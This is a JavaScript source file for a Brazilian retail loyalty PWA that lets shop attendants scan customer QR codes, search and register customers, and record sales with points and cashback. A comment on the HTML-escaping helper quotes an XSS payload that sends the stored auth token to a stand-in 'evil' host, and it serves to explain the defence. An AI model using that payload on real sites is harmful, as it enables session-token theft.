// PWA Loja — registra vendas, lê QR do cliente
const API = '/api/v1';
const $ = (s, ctx = document) => ctx.querySelector(s);

/**
 * Escapa string para uso seguro em interpolação dentro de innerHTML.
 * Use SEMPRE que renderizar dados vindos do servidor (nome, telefone,
 * descrição) — caso contrário, um cliente cadastrado com nome
 * `<img src=x onerror=fetch('//evil/'+localStorage.loja_token)>` rouba
 * o token Sanctum quando o atendente abrir a busca.
 */
function esc(s) {
    if (s === null || s === undefined) return '';
    return String(s).replace(/[&<>"']/g, c => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
    })[c]);
}
/** Atributo dentro de aspas duplas — atributos só precisam de escape de `"` `&` `<`, mas usamos esc() para uniformidade. */
function escAttr(s) { return esc(s); }

const STATE = {
    token: localStorage.getItem('loja_token') || null,
    user: JSON.parse(localStorage.getItem('loja_user') || 'null'),
    cliente: null, // cliente atualmente selecionado para lançar venda
    telaAtual: null,
};

const screenContainer = $('#screen-container');
const bottomNav = $('#bottom-nav');

// Telas disponíveis
const TELAS = {
    login: telaLogin,
    home: telaHome,
    scanner: telaScanner,
    venda: telaVenda,
    sucesso: telaSucesso,
    busca: telaBusca,
    novoCliente: telaNovoCliente,
    perfil: telaPerfil,
};

function persistir() {
    if (STATE.token) localStorage.setItem('loja_token', STATE.token); else localStorage.removeItem('loja_token');
    if (STATE.user) localStorage.setItem('loja_user', JSON.stringify(STATE.user)); else localStorage.removeItem('loja_user');
}

async function api(path, opts = {}) {
    const headers = { 'Accept': 'application/json' };
    if (!(opts.body instanceof FormData)) headers['Content-Type'] = 'application/json';
    if (STATE.token) headers['Authorization'] = 'Bearer ' + STATE.token;

    const res = await fetch(API + path, { ...opts, headers: { ...headers, ...(opts.headers || {}) } });
    const data = await res.json().catch(() => ({}));

    if (res.status === 401) {
        STATE.token = null;
        STATE.user = null;
        persistir();
        showScreen('login');
        throw new Error('Sessão expirada — faça login novamente.');
    }

    if (!res.ok) {
        throw new Error(data.message || data.errors?.[Object.keys(data.errors)[0]]?.[0] || 'Erro de comunicação');
    }
    return data;
}

function toast(msg, tipo = 'info') {
    const t = $('#toast');
    t.textContent = msg;
    t.className = 'fixed top-4 left-1/2 -translate-x-1/2 z-50 px-4 py-2 rounded-full text-sm shadow-lg text-white ' +
        (tipo === 'error' ? 'bg-rose-600' : tipo === 'success' ? 'bg-emerald-600' : 'bg-slate-900');
    setTimeout(() => t.classList.add('hidden'), 10);
    requestAnimationFrame(() => t.classList.remove('hidden'));
    setTimeout(() => t.classList.add('hidden'), 2800);
}

function fmtBRL(v) { return 'R$ ' + Number(v || 0).toFixed(2).replace('.', ','); }
function fmtNum(v) { return Number(v || 0).toLocaleString('pt-BR'); }

function showScreen(nome) {
    if (!STATE.token && nome !== 'login') nome = 'login';
    STATE.telaAtual = nome;

    // Para o scanner se sair da tela de scanner
    if (nome !== 'scanner') pararScanner();

    const fn = TELAS[nome];
    if (!fn) return;

    bottomNav.classList.toggle('hidden', !STATE.token || ['login','venda','sucesso','novoCliente'].includes(nome));
    if (STATE.token) {
        bottomNav.querySelectorAll('.nav-btn').forEach((b, i) => {
            b.classList.toggle('active', ['home','scanner','perfil'][i] === nome);
        });
    }
    fn();
}

// =============================================================
// LOGIN
// =============================================================
function telaLogin() {
    const cor = window.SISTEMA_COR_PRIMARIA, corSec = window.SISTEMA_COR_SECUNDARIA;
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col">
        <div class="px-6 pt-12 pb-10 text-white text-center" style="background:linear-gradient(135deg,${cor},${corSec})">
            ${window.SISTEMA_LOGO
                ? `<img src="${window.SISTEMA_LOGO}" class="w-20 h-20 mx-auto rounded-2xl bg-white/10 p-3 backdrop-blur shadow-lg" alt="">`
                : `<div class="w-20 h-20 mx-auto rounded-2xl bg-white/20 backdrop-blur shadow-lg flex items-center justify-center">
                       <i class="ri-store-2-line text-4xl"></i>
                   </div>`}
            <h1 class="text-2xl font-bold mt-5">${window.SISTEMA_NOME} Loja</h1>
            <p class="text-white/80 text-sm mt-1">Acesso para atendentes da loja</p>
        </div>

        <form id="form-login" class="px-5 -mt-6 pb-6 flex-1 flex flex-col">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-5 space-y-4">
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">E-mail</label>
                    <div class="relative">
                        <i class="ri-mail-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input name="email" type="email" required autocomplete="username"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Senha</label>
                    <div class="relative">
                        <i class="ri-lock-2-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input name="password" type="password" required autocomplete="current-password"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>
            </div>
            <button type="submit" class="w-full mt-4 py-3.5 text-white rounded-2xl font-semibold flex items-center justify-center gap-2 shadow-md hover:shadow-lg transition"
                    style="background:linear-gradient(135deg,${cor},${corSec})">
                <i class="ri-login-box-line"></i> Entrar
            </button>
        </form>
    </div>`;

    $('#form-login').addEventListener('submit', async (ev) => {
        ev.preventDefault();
        const fd = Object.fromEntries(new FormData(ev.target));
        try {
            const res = await api('/loja/login', { method: 'POST', body: JSON.stringify(fd) });
            STATE.token = res.token;
            STATE.user = res.user;
            persistir();
            showScreen('home');
        } catch (e) { toast(e.message, 'error'); }
    });
}

// =============================================================
// HOME
// =============================================================
function telaHome() {
    const u = STATE.user;
    const cor = u.empresa?.cor_primaria || window.SISTEMA_COR_PRIMARIA;
    const corSec = u.empresa?.cor_secundaria || window.SISTEMA_COR_SECUNDARIA;
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-8 pb-12 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <div class="flex items-center gap-3">
                ${u.empresa?.logo
                    ? `<img src="${escAttr(u.empresa.logo)}" class="w-12 h-12 rounded-xl bg-white/10 p-1 object-contain">`
                    : `<div class="w-12 h-12 rounded-xl bg-white/20 flex items-center justify-center"><i class="ri-store-2-line text-2xl"></i></div>`}
                <div>
                    <p class="text-white/70 text-xs uppercase tracking-wider">Loja</p>
                    <h1 class="text-xl font-bold">${esc(u.empresa?.nome || '')}</h1>
                </div>
            </div>
            <p class="text-white/80 text-sm mt-4">Olá, ${esc(String(u.nome || '').split(' ')[0])} 👋</p>
            <p class="text-white/60 text-xs">Pronto para registrar a próxima venda?</p>
        </div>

        <div class="px-4 -mt-6 grid grid-cols-1 gap-3">
            <button onclick="showScreen('scanner')" class="bg-white rounded-2xl shadow-md border border-slate-100 p-5 flex items-center gap-4 hover:bg-slate-50 transition text-left">
                <div class="w-14 h-14 rounded-xl flex items-center justify-center text-white shadow"
                     style="background:linear-gradient(135deg,${cor},${corSec})">
                    <i class="ri-qr-scan-2-line text-2xl"></i>
                </div>
                <div class="flex-1">
                    <p class="font-semibold text-slate-800">Ler QR Code</p>
                    <p class="text-xs text-slate-500 mt-0.5">Use a câmera para identificar o cliente</p>
                </div>
                <i class="ri-arrow-right-s-line text-slate-400 text-2xl"></i>
            </button>

            <button onclick="showScreen('busca')" class="bg-white rounded-2xl shadow-md border border-slate-100 p-5 flex items-center gap-4 hover:bg-slate-50 transition text-left">
                <div class="w-14 h-14 rounded-xl bg-slate-100 flex items-center justify-center text-slate-700">
                    <i class="ri-search-line text-2xl"></i>
                </div>
                <div class="flex-1">
                    <p class="font-semibold text-slate-800">Buscar cliente</p>
                    <p class="text-xs text-slate-500 mt-0.5">Por telefone, CPF ou nome</p>
                </div>
                <i class="ri-arrow-right-s-line text-slate-400 text-2xl"></i>
            </button>

            <button onclick="showScreen('novoCliente')" class="bg-white rounded-2xl shadow-md border border-slate-100 p-5 flex items-center gap-4 hover:bg-slate-50 transition text-left">
                <div class="w-14 h-14 rounded-xl bg-emerald-50 flex items-center justify-center text-emerald-600">
                    <i class="ri-user-add-line text-2xl"></i>
                </div>
                <div class="flex-1">
                    <p class="font-semibold text-slate-800">Cadastrar cliente</p>
                    <p class="text-xs text-slate-500 mt-0.5">Cliente novo direto da loja</p>
                </div>
                <i class="ri-arrow-right-s-line text-slate-400 text-2xl"></i>
            </button>
        </div>
    </div>`;
}

// =============================================================
// SCANNER QR
// =============================================================
let _scannerStream = null;
let _scannerLoop = null;
let _scannerBarcodeDetector = null;

async function carregarJsQR() {
    if (window.jsQR) return;
    return new Promise((resolve, reject) => {
        const s = document.createElement('script');
        s.src = 'https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js';
        s.onload = resolve;
        s.onerror = reject;
        document.head.appendChild(s);
    });
}

function pararScanner() {
    if (_scannerLoop) { cancelAnimationFrame(_scannerLoop); _scannerLoop = null; }
    if (_scannerStream) {
        _scannerStream.getTracks().forEach(t => t.stop());
        _scannerStream = null;
    }
    _scannerBarcodeDetector = null;
}

async function telaScanner() {
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col bg-black text-white">
        <div class="px-4 pt-4 pb-3 flex items-center justify-between bg-black/60 backdrop-blur">
            <button onclick="showScreen('home')" class="p-2 -ml-2"><i class="ri-arrow-left-line text-2xl"></i></button>
            <h1 class="font-semibold">Ler QR Code</h1>
            <div class="w-8"></div>
        </div>

        <div class="flex-1 relative overflow-hidden">
            <video id="scanner-video" class="absolute inset-0 w-full h-full object-cover" playsinline muted></video>
            <canvas id="scanner-canvas" class="hidden"></canvas>
            <div class="absolute inset-0 flex items-center justify-center pointer-events-none">
                <div class="w-64 h-64 border-4 border-white/80 rounded-2xl shadow-[0_0_0_9999px_rgba(0,0,0,0.45)]"></div>
            </div>
            <div id="scanner-status" class="absolute bottom-6 inset-x-0 text-center text-white/90 text-sm">
                Posicione o QR do cliente dentro do quadro
            </div>
        </div>

        <div class="p-4 bg-black/80">
            <button onclick="showScreen('busca')" class="w-full py-3 bg-white/15 backdrop-blur rounded-xl font-medium flex items-center justify-center gap-2">
                <i class="ri-search-line"></i> Buscar manualmente
            </button>
        </div>
    </div>`;

    const video = $('#scanner-video');
    const canvas = $('#scanner-canvas');
    const status = $('#scanner-status');

    try {
        _scannerStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'environment' },
            audio: false,
        });
        video.srcObject = _scannerStream;
        await video.play();
    } catch (e) {
        status.innerHTML = '<span class="text-rose-300">Não foi possível acessar a câmera.</span>';
        return;
    }

    // BarcodeDetector nativo (Chrome Android, Safari 17+)
    if ('BarcodeDetector' in window) {
        try {
            const fmts = await window.BarcodeDetector.getSupportedFormats();
            if (fmts.includes('qr_code')) {
                _scannerBarcodeDetector = new window.BarcodeDetector({ formats: ['qr_code'] });
            }
        } catch (e) { /* fallback abaixo */ }
    }

    if (!_scannerBarcodeDetector) {
        try { await carregarJsQR(); }
        catch (e) {
            status.innerHTML = '<span class="text-rose-300">Falha ao carregar leitor QR.</span>';
            return;
        }
    }

    const ctx = canvas.getContext('2d', { willReadFrequently: true });
    let processando = false;

    async function tick() {
        if (!_scannerStream) return;
        if (video.readyState < 2 || processando) {
            _scannerLoop = requestAnimationFrame(tick);
            return;
        }
        processando = true;

        let codigo = null;
        try {
            if (_scannerBarcodeDetector) {
                const barcodes = await _scannerBarcodeDetector.detect(video);
                if (barcodes.length) codigo = barcodes[0].rawValue;
            } else {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const img = ctx.getImageData(0, 0, canvas.width, canvas.height);
                const r = window.jsQR(img.data, img.width, img.height, { inversionAttempts: 'dontInvert' });
                if (r) codigo = r.data;
            }
        } catch (e) { /* ignora frames ruins */ }

        if (codigo) {
            pararScanner();
            await onQrLido(codigo);
            return;
        }

        processando = false;
        _scannerLoop = requestAnimationFrame(tick);
    }
    _scannerLoop = requestAnimationFrame(tick);
}

async function onQrLido(codigo) {
    try {
        const res = await api('/loja/clientes/qr/' + encodeURIComponent(codigo));
        STATE.cliente = res.cliente;
        showScreen('venda');
    } catch (e) {
        toast('QR não corresponde a um cliente desta loja.', 'error');
        // pequeno delay e volta a escanear
        setTimeout(() => showScreen('scanner'), 1200);
    }
}

// =============================================================
// BUSCA MANUAL
// =============================================================
function telaBusca() {
    const cor = window.SISTEMA_COR_PRIMARIA;
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col">
        <div class="px-4 pt-6 pb-4 border-b border-slate-100 flex items-center gap-3">
            <button onclick="showScreen('home')" class="p-2 -ml-2"><i class="ri-arrow-left-line text-2xl text-slate-700"></i></button>
            <h1 class="font-semibold text-slate-800">Buscar cliente</h1>
        </div>
        <div class="px-4 py-4">
            <div class="relative">
                <i class="ri-search-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                <input id="busca-q" placeholder="Telefone, CPF ou nome" autofocus
                       class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
            </div>
            <p class="text-xs text-slate-500 mt-2 ml-1">Digite ao menos 2 caracteres</p>
        </div>
        <div id="busca-results" class="px-4 pb-6 space-y-2"></div>
    </div>`;

    const input = $('#busca-q');
    const results = $('#busca-results');
    let timer = null;

    input.addEventListener('input', () => {
        clearTimeout(timer);
        const q = input.value.trim();
        if (q.length < 2) { results.innerHTML = ''; return; }
        timer = setTimeout(async () => {
            try {
                const r = await api('/loja/clientes?q=' + encodeURIComponent(q));
                if (!r.clientes.length) {
                    results.innerHTML = `<p class="text-center text-slate-500 text-sm py-6">Nenhum cliente encontrado.</p>`;
                    return;
                }
                results.innerHTML = r.clientes.map(c => `
                    <button data-id="${Number(c.id)}" class="cliente-card w-full bg-white border border-slate-200 rounded-2xl p-3 flex items-center gap-3 hover:bg-slate-50 transition text-left">
                        <div class="w-10 h-10 rounded-full text-white font-bold flex items-center justify-center overflow-hidden" style="background:${escAttr(cor)}">
                            ${c.foto ? `<img src="${escAttr(c.foto)}" class="w-full h-full object-cover">` : esc(String(c.nome || '').charAt(0).toUpperCase())}
                        </div>
                        <div class="flex-1 min-w-0">
                            <p class="font-semibold text-slate-800 truncate">${esc(c.nome)}</p>
                            <p class="text-xs text-slate-500 truncate">${esc(c.telefone || '')}${c.cpf ? ' • ' + esc(c.cpf) : ''}</p>
                        </div>
                        <div class="text-right text-xs">
                            <p class="text-slate-700 font-semibold">${fmtNum(c.pontos)} pts</p>
                            <p class="text-emerald-600 font-semibold">${fmtBRL(c.cashback)}</p>
                        </div>
                    </button>`).join('');
                results.querySelectorAll('.cliente-card').forEach(el => {
                    el.addEventListener('click', () => {
                        const id = Number(el.dataset.id);
                        STATE.cliente = r.clientes.find(c => c.id === id);
                        showScreen('venda');
                    });
                });
            } catch (e) { toast(e.message, 'error'); }
        }, 280);
    });
}

// =============================================================
// VENDA
// =============================================================
function telaVenda() {
    if (!STATE.cliente) { showScreen('home'); return; }
    const c = STATE.cliente;
    const cor = window.SISTEMA_COR_PRIMARIA, corSec = window.SISTEMA_COR_SECUNDARIA;

    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <button onclick="showScreen('home')" class="text-white/80 mb-3 flex items-center gap-1 text-sm">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>
            <div class="flex items-center gap-3">
                <div class="w-14 h-14 rounded-full bg-white/20 backdrop-blur border-2 border-white/30 flex items-center justify-center text-2xl font-bold overflow-hidden">
                    ${c.foto ? `<img src="${escAttr(c.foto)}" class="w-full h-full object-cover">` : esc(String(c.nome || '').charAt(0).toUpperCase())}
                </div>
                <div class="min-w-0 flex-1">
                    <h1 class="text-lg font-bold truncate">${esc(c.nome)}</h1>
                    <p class="text-white/80 text-xs truncate">${esc(c.telefone || '')}</p>
                </div>
            </div>
            <div class="grid grid-cols-3 gap-2 mt-5 bg-white/15 backdrop-blur rounded-2xl border border-white/20 p-3 text-center">
                <div>
                    <p class="text-[10px] text-white/70 uppercase tracking-wider">Pontos</p>
                    <p class="font-bold mt-0.5">${fmtNum(c.pontos)}</p>
                </div>
                <div class="border-x border-white/20">
                    <p class="text-[10px] text-white/70 uppercase tracking-wider">Cashback</p>
                    <p class="font-bold mt-0.5">${fmtBRL(c.cashback)}</p>
                </div>
                <div>
                    <p class="text-[10px] text-white/70 uppercase tracking-wider">Pendente</p>
                    <p class="font-bold mt-0.5">${fmtBRL(c.cashback_pendente)}</p>
                </div>
            </div>
        </div>

        <form id="form-venda" class="px-4 -mt-6 pb-6">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-5 space-y-4">
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Valor da compra</label>
                    <div class="relative">
                        <span class="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-500 font-medium">R$</span>
                        <input name="valor" type="text" inputmode="decimal" required placeholder="0,00" autofocus
                               class="w-full pl-10 pr-4 py-3 text-2xl font-bold bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>

                ${c.cashback > 0 ? `
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Usar cashback (opcional)</label>
                    <div class="relative">
                        <span class="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-500 font-medium">R$</span>
                        <input name="usar_cashback" type="text" inputmode="decimal" placeholder="0,00"
                               class="w-full pl-10 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                    <p class="text-[11px] text-slate-500 mt-1 ml-1">Disponível: ${fmtBRL(c.cashback)}</p>
                </div>` : ''}

                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Descrição (opcional)</label>
                    <input name="descricao" type="text" maxlength="255" placeholder="Ex: Almoço, Pedido #123"
                           class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                </div>
            </div>

            <button type="submit" class="w-full mt-4 py-3.5 text-white rounded-2xl font-semibold flex items-center justify-center gap-2 shadow-md hover:shadow-lg transition"
                    style="background:linear-gradient(135deg,${cor},${corSec})">
                <i class="ri-check-line text-xl"></i> Registrar compra
            </button>
        </form>
    </div>`;

    // Máscara de moeda nos campos numéricos
    screenContainer.querySelectorAll('input[inputmode="decimal"]').forEach(el => {
        el.addEventListener('input', () => {
            let v = el.value.replace(/\D/g, '');
            if (!v) { el.value = ''; return; }
            v = (Number(v) / 100).toFixed(2).replace('.', ',');
            el.value = v.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
        });
    });

    $('#form-venda').addEventListener('submit', async (ev) => {
        ev.preventDefault();
        const fd = new FormData(ev.target);
        const valor = parseFloat(String(fd.get('valor') || '').replace(/\./g, '').replace(',', '.'));
        const usarCb = parseFloat(String(fd.get('usar_cashback') || '0').replace(/\./g, '').replace(',', '.')) || 0;
        if (!valor || valor <= 0) { toast('Informe o valor da compra.', 'error'); return; }

        try {
            const res = await api('/loja/compras', {
                method: 'POST',
                body: JSON.stringify({
                    cliente_id: c.id,
                    valor,
                    usar_cashback: usarCb,
                    descricao: fd.get('descricao') || null,
                }),
            });
            STATE.ultimaCompra = res;
            showScreen('sucesso');
        } catch (e) { toast(e.message, 'error'); }
    });
}

// =============================================================
// SUCESSO
// =============================================================
function telaSucesso() {
    const r = STATE.ultimaCompra || {};
    const cor = window.SISTEMA_COR_PRIMARIA, corSec = window.SISTEMA_COR_SECUNDARIA;
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col items-center justify-center p-6 text-center bg-slate-50">
        <div class="w-24 h-24 rounded-full bg-emerald-100 flex items-center justify-center mb-5">
            <i class="ri-check-line text-emerald-600 text-5xl"></i>
        </div>
        <h1 class="text-2xl font-bold text-slate-800">Compra registrada!</h1>
        <p class="text-slate-500 mt-1">${r.compra ? fmtBRL(r.compra.valor) : ''}</p>

        <div class="w-full max-w-xs bg-white border border-slate-200 rounded-2xl p-4 mt-6 text-left grid grid-cols-2 gap-3">
            <div>
                <p class="text-[11px] text-slate-500 uppercase tracking-wider">Pontos gerados</p>
                <p class="text-xl font-bold text-slate-800 mt-0.5">+${fmtNum(r.compra?.pontos_gerados || 0)}</p>
            </div>
            <div>
                <p class="text-[11px] text-slate-500 uppercase tracking-wider">Cashback gerado</p>
                <p class="text-xl font-bold text-emerald-600 mt-0.5">+${fmtBRL(r.compra?.cashback_gerado || 0)}</p>
            </div>
        </div>

        ${r.cliente ? `
        <p class="text-xs text-slate-500 mt-4">
            ${esc(String(r.cliente.nome || '').split(' ')[0])} agora tem
            <strong class="text-slate-700">${fmtNum(r.cliente.pontos)} pts</strong>
            e <strong class="text-emerald-600">${fmtBRL(r.cliente.cashback)}</strong>.
        </p>` : ''}

        <div class="w-full max-w-xs space-y-2 mt-8">
            <button onclick="showScreen('scanner')" class="w-full py-3.5 text-white rounded-2xl font-semibold flex items-center justify-center gap-2 shadow-md"
                    style="background:linear-gradient(135deg,${cor},${corSec})">
                <i class="ri-qr-scan-2-line"></i> Próxima venda
            </button>
            <button onclick="showScreen('home')" class="w-full py-3 text-slate-600 font-medium rounded-2xl hover:bg-slate-100 transition">
                Voltar ao início
            </button>
        </div>
    </div>`;
}

// =============================================================
// NOVO CLIENTE
// =============================================================
function telaNovoCliente() {
    const cor = window.SISTEMA_COR_PRIMARIA, corSec = window.SISTEMA_COR_SECUNDARIA;
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <button onclick="showScreen('home')" class="text-white/80 mb-3 flex items-center gap-1 text-sm">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>
            <h1 class="text-2xl font-bold">Cadastrar cliente</h1>
            <p class="text-white/80 text-sm mt-1">Cliente novo direto da loja</p>
        </div>

        <form id="form-novo" class="px-4 -mt-6 pb-6 flex-1">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-5 space-y-4">
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Nome completo *</label>
                    <input name="nome" required class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                </div>
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Telefone *</label>
                    <input name="telefone" required class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                </div>
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">CPF</label>
                    <input name="cpf" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                </div>
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Data de nascimento</label>
                    <input name="data_nascimento" type="date" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                </div>
            </div>
            <button type="submit" class="w-full mt-4 py-3.5 text-white rounded-2xl font-semibold flex items-center justify-center gap-2 shadow-md hover:shadow-lg transition"
                    style="background:linear-gradient(135deg,${cor},${corSec})">
                <i class="ri-user-add-line"></i> Cadastrar e ir para venda
            </button>
        </form>
    </div>`;

    // Máscara telefone brasileiro
    const fone = $('input[name="telefone"]');
    fone.addEventListener('input', () => {
        let v = fone.value.replace(/\D/g, '').slice(0, 11);
        if (v.length > 6) v = '(' + v.slice(0,2) + ') ' + v.slice(2,7) + '-' + v.slice(7);
        else if (v.length > 2) v = '(' + v.slice(0,2) + ') ' + v.slice(2);
        else if (v.length) v = '(' + v;
        fone.value = v;
    });

    $('#form-novo').addEventListener('submit', async (ev) => {
        ev.preventDefault();
        const fd = Object.fromEntries(new FormData(ev.target));
        Object.keys(fd).forEach(k => { if (fd[k] === '') fd[k] = null; });
        try {
            const res = await api('/loja/clientes', { method: 'POST', body: JSON.stringify(fd) });
            STATE.cliente = res.cliente;
            toast('Cliente cadastrado!', 'success');
            showScreen('venda');
        } catch (e) { toast(e.message, 'error'); }
    });
}

// =============================================================
// PERFIL
// =============================================================
function telaPerfil() {
    const u = STATE.user;
    const cor = u.empresa?.cor_primaria || window.SISTEMA_COR_PRIMARIA;
    const corSec = u.empresa?.cor_secundaria || window.SISTEMA_COR_SECUNDARIA;
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col bg-slate-50">
        <div class="px-5 pt-8 pb-12 text-white text-center" style="background:linear-gradient(135deg,${cor},${corSec})">
            <div class="w-24 h-24 mx-auto rounded-full bg-white/20 backdrop-blur border-4 border-white/30 flex items-center justify-center text-4xl font-bold shadow-lg">
                ${esc(String(u.nome || '').charAt(0).toUpperCase())}
            </div>
            <h1 class="text-2xl font-bold mt-4">${esc(u.nome)}</h1>
            <p class="text-white/80 text-sm">${esc(u.email)}</p>
            <p class="text-white/70 text-xs mt-1">${esc(u.role || '')}</p>
        </div>
        <div class="px-4 -mt-8">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-4">
                <p class="text-xs text-slate-500 uppercase tracking-wider">Loja</p>
                <p class="font-semibold text-slate-800 mt-0.5">${esc(u.empresa?.nome || '—')}</p>
            </div>
        </div>
        <div class="px-4 mt-6 pb-6">
            <button onclick="logout()" class="w-full py-3.5 bg-white border border-rose-200 text-rose-600 rounded-2xl font-semibold flex items-center justify-center gap-2 hover:bg-rose-50 transition">
                <i class="ri-logout-box-line text-xl"></i> Sair da conta
            </button>
        </div>
    </div>`;
}

async function logout() {
    try { await api('/loja/logout', { method: 'POST' }); } catch (e) { /* ignora */ }
    STATE.token = null;
    STATE.user = null;
    persistir();
    showScreen('login');
}

// =============================================================
// PWA install + boot
// =============================================================
let _deferredInstall = null;
window.addEventListener('beforeinstallprompt', (e) => {
    e.preventDefault();
    _deferredInstall = e;
    $('#install-btn')?.classList.remove('hidden');
});

$('#install-btn')?.addEventListener('click', async () => {
    if (!_deferredInstall) return;
    _deferredInstall.prompt();
    await _deferredInstall.userChoice;
    _deferredInstall = null;
    $('#install-btn').classList.add('hidden');
});

window.addEventListener('appinstalled', () => {
    _deferredInstall = null;
    $('#install-btn')?.classList.add('hidden');
});

if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/loja/sw.js', { scope: '/loja/' }).catch(() => {});
}

async function boot() {
    if (STATE.token) {
        try {
            const res = await api('/loja/me');
            STATE.user = res.user;
            persistir();
            showScreen('home');
            return;
        } catch (e) { /* token inválido, cai no login */ }
    }
    showScreen('login');
}

boot();
